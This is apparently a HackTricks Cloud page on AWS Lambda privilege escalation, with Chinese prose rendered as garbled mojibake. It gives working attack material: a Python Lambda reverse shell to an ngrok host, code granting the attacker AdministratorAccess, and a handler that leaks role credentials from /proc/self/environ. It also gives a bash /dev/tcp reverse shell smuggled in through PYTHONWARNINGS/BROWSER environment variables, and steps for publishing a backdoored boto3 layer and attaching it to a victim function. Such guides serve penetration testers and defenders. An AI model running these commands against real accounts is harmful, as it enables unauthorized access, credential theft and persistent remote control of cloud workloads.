# AWS - Lambda Privesc

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## lambda

æœ‰å…³ lambda çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ï¼š

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

å…·æœ‰ **`iam:PassRole`, `lambda:CreateFunction` å’Œ `lambda:InvokeFunction`** æƒé™çš„ç”¨æˆ·å¯ä»¥æå‡ä»–ä»¬çš„æƒé™ã€‚\
ä»–ä»¬å¯ä»¥ **åˆ›å»ºä¸€ä¸ªæ–°çš„ Lambda å‡½æ•°å¹¶ä¸ºå…¶åˆ†é…ä¸€ä¸ªç°æœ‰çš„ IAM è§’è‰²**ï¼Œä»è€Œæˆäºˆè¯¥å‡½æ•°ä¸è¯¥è§’è‰²ç›¸å…³è”çš„æƒé™ã€‚ç„¶åï¼Œç”¨æˆ·å¯ä»¥ **å‘æ­¤ Lambda å‡½æ•°ç¼–å†™å’Œä¸Šä¼ ä»£ç ï¼ˆä¾‹å¦‚å¸¦æœ‰ rev shell çš„ä»£ç ï¼‰**ã€‚\
ä¸€æ—¦å‡½æ•°è®¾ç½®å®Œæˆï¼Œç”¨æˆ·å¯ä»¥ **é€šè¿‡ AWS API è§¦å‘å…¶æ‰§è¡Œ** å’Œé¢„æœŸçš„æ“ä½œã€‚è¿™ç§æ–¹æ³•æœ‰æ•ˆåœ°å…è®¸ç”¨æˆ·é€šè¿‡ Lambda å‡½æ•°é—´æ¥æ‰§è¡Œä»»åŠ¡ï¼Œæ“ä½œæƒé™ä¸ä¸ä¹‹å…³è”çš„ IAM è§’è‰²æˆäºˆçš„è®¿é—®çº§åˆ«ç›¸åŒã€‚\\

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è·å– **rev shell å¹¶çªƒå–ä»¤ç‰Œ**ï¼š

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
æ‚¨è¿˜å¯ä»¥**æ»¥ç”¨lambdaè§’è‰²æƒé™**æ¥è‡ªlambdaå‡½æ•°æœ¬èº«ã€‚\
å¦‚æœlambdaè§’è‰²å…·æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæˆäºˆæ‚¨ç®¡ç†å‘˜æƒé™ï¼š
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
ä¹Ÿå¯ä»¥åœ¨ä¸éœ€è¦å¤–éƒ¨è¿æ¥çš„æƒ…å†µä¸‹æ³„éœ²lambdaçš„è§’è‰²å‡­è¯ã€‚è¿™å¯¹äºç”¨äºå†…éƒ¨ä»»åŠ¡çš„**ç½‘ç»œéš”ç¦»çš„Lambdas**å°†éå¸¸æœ‰ç”¨ã€‚å¦‚æœæœ‰æœªçŸ¥çš„å®‰å…¨ç»„è¿‡æ»¤æ‚¨çš„åå‘shellï¼Œè¿™æ®µä»£ç å°†å…è®¸æ‚¨ç›´æ¥å°†å‡­è¯ä½œä¸ºlambdaçš„è¾“å‡ºæ³„éœ²ã€‚
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°æŒ‡å®šçš„ä»»æ„ lambda æœåŠ¡è§’è‰²ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå³ä½¿çœ‹èµ·æ¥å¾ˆæœ‰è¶£ï¼Œ**`lambda:InvokeAsync`** **å¹¶ä¸**å…è®¸å•ç‹¬**æ‰§è¡Œ `aws lambda invoke-async`**ï¼Œæ‚¨è¿˜éœ€è¦ `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`ï¼Œ`lambda:CreateFunction`ï¼Œ`lambda:AddPermission`

ä¸ä¹‹å‰çš„åœºæ™¯ä¸€æ ·ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æƒé™ **`lambda:AddPermission`**ï¼Œæ‚¨å¯ä»¥**æˆäºˆè‡ªå·± `lambda:InvokeFunction`** æƒé™ã€‚
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°æŒ‡å®šçš„ä»»æ„ Lambda æœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

æ‹¥æœ‰ **`iam:PassRole`, `lambda:CreateFunction` å’Œ `lambda:CreateEventSourceMapping`** æƒé™çš„ç”¨æˆ·ï¼ˆå¯èƒ½è¿˜åŒ…æ‹¬ `dynamodb:PutItem` å’Œ `dynamodb:CreateTable`ï¼‰å¯ä»¥é—´æ¥ **æå‡æƒé™**ï¼Œå³ä½¿æ²¡æœ‰ `lambda:InvokeFunction`ã€‚\
ä»–ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª **å¸¦æœ‰æ¶æ„ä»£ç çš„ Lambda å‡½æ•°å¹¶å°†å…¶åˆ†é…ç»™ç°æœ‰çš„ IAM è§’è‰²**ã€‚

ç”¨æˆ·ä¸æ˜¯ç›´æ¥è°ƒç”¨ Lambdaï¼Œè€Œæ˜¯è®¾ç½®æˆ–åˆ©ç”¨ç°æœ‰çš„ DynamoDB è¡¨ï¼Œé€šè¿‡äº‹ä»¶æºæ˜ å°„å°†å…¶é“¾æ¥åˆ° Lambdaã€‚æ­¤è®¾ç½®ç¡®ä¿åœ¨è¡¨ä¸­æ–°å¢é¡¹æ—¶ï¼ŒLambda å‡½æ•°ä¼š **è‡ªåŠ¨è§¦å‘**ï¼Œæ— è®ºæ˜¯é€šè¿‡ç”¨æˆ·çš„æ“ä½œè¿˜æ˜¯å…¶ä»–è¿›ç¨‹ï¼Œä»è€Œé—´æ¥è°ƒç”¨ Lambda å‡½æ•°å¹¶ä»¥ä¼ é€’çš„ IAM è§’è‰²çš„æƒé™æ‰§è¡Œä»£ç ã€‚
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
å¦‚æœDynamoDBåœ¨AWSç¯å¢ƒä¸­å·²ç»æ¿€æ´»ï¼Œç”¨æˆ·åªéœ€**ä¸ºLambdaå‡½æ•°å»ºç«‹äº‹ä»¶æºæ˜ å°„**ã€‚ç„¶è€Œï¼Œå¦‚æœDynamoDBæœªåœ¨ä½¿ç”¨ä¸­ï¼Œç”¨æˆ·å¿…é¡»**åˆ›å»ºä¸€ä¸ªæ–°çš„è¡¨**å¹¶å¯ç”¨æµï¼š
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
ç°åœ¨å¯ä»¥é€šè¿‡**åˆ›å»ºäº‹ä»¶æºæ˜ å°„**æ¥**å°†Lambdaå‡½æ•°è¿æ¥åˆ°DynamoDBè¡¨**ï¼š
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
é€šè¿‡å°† Lambda å‡½æ•°é“¾æ¥åˆ° DynamoDB æµï¼Œæ”»å‡»è€…å¯ä»¥ **é€šè¿‡æ¿€æ´» DynamoDB æµé—´æ¥è§¦å‘ Lambda**ã€‚è¿™å¯ä»¥é€šè¿‡ **å‘ DynamoDB è¡¨ä¸­æ’å…¥ä¸€ä¸ªé¡¹ç›®** æ¥å®ç°ï¼š
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°æŒ‡å®šçš„ lambda æœåŠ¡è§’è‰²ã€‚

### `lambda:AddPermission`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥ **æˆäºˆè‡ªå·±ï¼ˆæˆ–ä»–äººï¼‰ä»»ä½•æƒé™** ï¼ˆè¿™ä¼šç”ŸæˆåŸºäºèµ„æºçš„ç­–ç•¥ä»¥æˆäºˆå¯¹èµ„æºçš„è®¿é—®ï¼‰ï¼š 

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡æƒé™åˆ°é€šè¿‡æˆäºˆä¿®æ”¹ä»£ç å’Œè¿è¡Œå®ƒçš„æƒé™çš„ lambda æœåŠ¡è§’è‰²ã€‚

### `lambda:AddLayerVersionPermission`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥ **æˆäºˆè‡ªå·±ï¼ˆæˆ–å…¶ä»–äººï¼‰æƒé™ `lambda:GetLayerVersion`**ã€‚ä»–å¯ä»¥è®¿é—®è¯¥å±‚å¹¶æœç´¢æ¼æ´æˆ–æ•æ„Ÿä¿¡æ¯ã€‚

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** å¯èƒ½è®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚

### `lambda:UpdateFunctionCode`

æŒæœ‰ **`lambda:UpdateFunctionCode`** æƒé™çš„ç”¨æˆ·æœ‰å¯èƒ½ **ä¿®æ”¹ä¸ IAM è§’è‰²å…³è”çš„ç°æœ‰ Lambda å‡½æ•°çš„ä»£ç ã€‚**\
æ”»å‡»è€…å¯ä»¥ **ä¿®æ”¹ Lambda çš„ä»£ç ä»¥æå– IAM å‡­è¯**ã€‚

å°½ç®¡æ”»å‡»è€…å¯èƒ½æ²¡æœ‰ç›´æ¥è°ƒç”¨è¯¥å‡½æ•°çš„èƒ½åŠ›ï¼Œä½†å¦‚æœ Lambda å‡½æ•°æ˜¯é¢„å…ˆå­˜åœ¨å¹¶ä¸”æ­£åœ¨è¿è¡Œçš„ï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½ä¼šé€šè¿‡ç°æœ‰çš„å·¥ä½œæµæˆ–äº‹ä»¶è¢«è§¦å‘ï¼Œä»è€Œé—´æ¥ä¿ƒè¿›ä¿®æ”¹åä»£ç çš„æ‰§è¡Œã€‚

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°ä½¿ç”¨çš„ lambda æœåŠ¡è§’è‰²ã€‚

### `lambda:UpdateFunctionConfiguration`

#### é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡Œ RCE

æ‹¥æœ‰æ­¤æƒé™åï¼Œå¯ä»¥æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œä½¿ Lambda æ‰§è¡Œä»»æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œåœ¨ Python ä¸­ï¼Œå¯ä»¥åˆ©ç”¨ç¯å¢ƒå˜é‡ `PYTHONWARNING` å’Œ `BROWSER` ä½¿ Python è¿›ç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

å¯¹äºå…¶ä»–è„šæœ¬è¯­è¨€ï¼Œè¿˜æœ‰å…¶ä»–ç¯å¢ƒå˜é‡å¯ä»¥ä½¿ç”¨ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é“¾æ¥ä¸­è„šæœ¬è¯­è¨€çš„å­éƒ¨åˆ†ï¼š

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### é€šè¿‡ Lambda Layers è¿›è¡Œ RCE

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) å…è®¸åœ¨æ‚¨çš„ Lambda å‡½æ•°ä¸­åŒ…å« **ä»£ç **ï¼Œä½† **å•ç‹¬å­˜å‚¨**ï¼Œè¿™æ ·å‡½æ•°ä»£ç å¯ä»¥ä¿æŒå°å·§ï¼Œå¹¶ä¸” **å¤šä¸ªå‡½æ•°å¯ä»¥å…±äº«ä»£ç **ã€‚

åœ¨ Lambda å†…éƒ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°æ£€æŸ¥åŠ è½½ Python ä»£ç çš„è·¯å¾„ï¼š
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
è¿™äº›åœ°æ–¹æ˜¯ï¼š

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ä¾‹å¦‚ï¼Œåº“ boto3 æ˜¯ä» `/var/runtime/boto3` åŠ è½½çš„ï¼ˆç¬¬ 4 ä¸ªä½ç½®ï¼‰ã€‚

#### åˆ©ç”¨

å¯ä»¥æ»¥ç”¨æƒé™ `lambda:UpdateFunctionConfiguration` æ¥ **æ·»åŠ ä¸€ä¸ªæ–°å±‚** åˆ°ä¸€ä¸ª lambda å‡½æ•°ã€‚è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œè¿™ä¸ªå±‚éœ€è¦åŒ…å«ä¸€äº› **lambda å°†è¦å¯¼å…¥çš„åº“ã€‚** å¦‚æœä½ èƒ½è¯»å– lambda çš„ä»£ç ï¼Œä½ å¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°è¿™ä¸€ç‚¹ï¼Œä¹Ÿè¯·æ³¨æ„ï¼Œlambda **å¯èƒ½å·²ç»åœ¨ä½¿ç”¨ä¸€ä¸ªå±‚**ï¼Œä½ å¯ä»¥ **ä¸‹è½½** è¿™ä¸ªå±‚å¹¶ **åœ¨å…¶ä¸­æ·»åŠ ä½ çš„ä»£ç **ã€‚

ä¾‹å¦‚ï¼Œå‡è®¾ lambda æ­£åœ¨ä½¿ç”¨åº“ boto3ï¼Œè¿™å°†åˆ›å»ºä¸€ä¸ªåŒ…å«åº“æœ€æ–°ç‰ˆæœ¬çš„æœ¬åœ°å±‚ï¼š
```bash
pip3 install -t ./lambda_layer boto3
```
æ‚¨å¯ä»¥æ‰“å¼€ `./lambda_layer/boto3/__init__.py` å¹¶**åœ¨å…¨å±€ä»£ç ä¸­æ·»åŠ åé—¨**ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªç”¨äºæå–å‡­æ®æˆ–è·å–åå‘ shell çš„å‡½æ•°ï¼‰ã€‚

ç„¶åï¼Œå°† `./lambda_layer` ç›®å½•å‹ç¼©å¹¶**åœ¨æ‚¨è‡ªå·±çš„è´¦æˆ·ä¸­ä¸Šä¼ æ–°çš„ lambda å±‚**ï¼ˆæˆ–åœ¨å—å®³è€…çš„è´¦æˆ·ä¸­ï¼Œä½†æ‚¨å¯èƒ½æ²¡æœ‰æƒé™è¿™æ ·åšï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ª python æ–‡ä»¶å¤¹å¹¶å°†åº“æ”¾åœ¨å…¶ä¸­ä»¥è¦†ç›– /opt/python/boto3ã€‚æ­¤å¤–ï¼Œå±‚éœ€è¦ä¸ lambda ä½¿ç”¨çš„**python ç‰ˆæœ¬å…¼å®¹**ï¼Œå¦‚æœæ‚¨å°†å…¶ä¸Šä¼ åˆ°æ‚¨çš„è´¦æˆ·ï¼Œå®ƒéœ€è¦åœ¨**åŒä¸€åŒºåŸŸï¼š** 

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

ç°åœ¨ï¼Œä½¿ä¸Šä¼ çš„ lambda å±‚ **å¯è¢«ä»»ä½•è´¦æˆ·è®¿é—®**ï¼š
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
å¹¶å°† lambda å±‚é™„åŠ åˆ°å—å®³è€… lambda å‡½æ•°ï¼š
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
ä¸‹ä¸€æ­¥è¦ä¹ˆæ˜¯**è‡ªå·±è°ƒç”¨å‡½æ•°**ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè¦ä¹ˆæ˜¯ç­‰å¾…å®ƒè¢«æ­£å¸¸æ–¹å¼**è°ƒç”¨**â€”â€”è¿™æ˜¯æ›´å®‰å…¨çš„æ–¹æ³•ã€‚

**åˆ©ç”¨æ­¤æ¼æ´çš„æ›´éšè”½æ–¹å¼**å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­æ‰¾åˆ°ï¼š

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°ä½¿ç”¨çš„lambdaæœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ä¹Ÿè®¸æœ‰äº†è¿™äº›æƒé™ï¼Œä½ èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªå‡½æ•°å¹¶é€šè¿‡è°ƒç”¨URLæ¥æ‰§è¡Œå®ƒâ€¦â€¦ä½†æˆ‘æ‰¾ä¸åˆ°æµ‹è¯•çš„æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœä½ æ‰¾åˆ°äº†ï¼Œè¯·å‘Šè¯‰æˆ‘ï¼

### Lambda MitM

ä¸€äº›lambdaå°†ä¼š**æ¥æ”¶ç”¨æˆ·åœ¨å‚æ•°ä¸­å‘é€çš„æ•æ„Ÿä¿¡æ¯ã€‚** å¦‚æœåœ¨å…¶ä¸­ä¸€ä¸ªä¸­è·å¾—RCEï¼Œä½ å¯ä»¥æå–å…¶ä»–ç”¨æˆ·å‘é€ç»™å®ƒçš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ï¼š

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
